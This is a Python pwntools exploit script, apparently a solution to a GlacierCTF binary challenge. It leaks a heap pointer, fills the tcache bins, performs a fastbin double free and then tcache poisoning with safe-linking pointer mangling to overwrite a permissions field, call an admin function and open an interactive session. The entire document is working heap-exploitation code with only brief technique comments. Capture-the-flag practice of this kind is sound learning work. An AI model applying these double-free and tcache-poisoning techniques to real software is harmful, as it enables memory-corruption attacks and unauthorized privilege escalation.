#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./app", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc chall.glacierctf.com 13373"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


def create(rating: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"rating\n> ", rating)


def delete(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"remove?\n> ", str(idx).encode())


def show():
    io.sendlineafter(b"> ", b"3")


def scream(aaa: bytes):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"content!\n", aaa)


def admin():
    io.sendlineafter(b"> ", b"5")


def reveal(ptr):
    mask = 0xfff << 36
    while mask:
        ptr ^= (ptr & mask) >> 12
        mask >>= 12
    return ptr


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


env = {}
io = start()

io.sendlineafter(b"username: ", cyclic(0x30))
io.sendlineafter(b"password: ", cyclic(0x30))

create(b"a" * 8)
create(b"b" * 8)
create(b"c" * 8)
delete(3)

show()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
heap_leak = u64(io.recvline().strip().split(b": ")[-1].ljust(8, b"\x00"))
log.info(f"{heap_leak=:#x}")
heap_base = heap_leak << 12
log.info(f"{heap_base=:#x}")
user_chunk = heap_base + 0x370

# fill up tcachebins
payload = b"\n".join([cyclic(0x10)] * 7 + [b"quit"])
scream(payload)

# fastbin dup
delete(1)
delete(2)
delete(1)

create(b"f" * 8)
create(b"f" * 8)
create(b"f" * 8)
create(b"f" * 8)
create(b"f" * 8)
create(b"f" * 8)
create(b"f" * 8)

# After tcachebins is empty, the fastbins are sorted into tcachebins
# which enable us to do tcache poisoning with the fastbin dup earlier
fd = mangle(heap_base + 0x4f0, user_chunk + 0x80)  # perms field
create(p64(fd))
create(b"f" * 8)
create(b"f" * 8)
create(p64(0) + p64(0x41))
admin()

io.interactive()
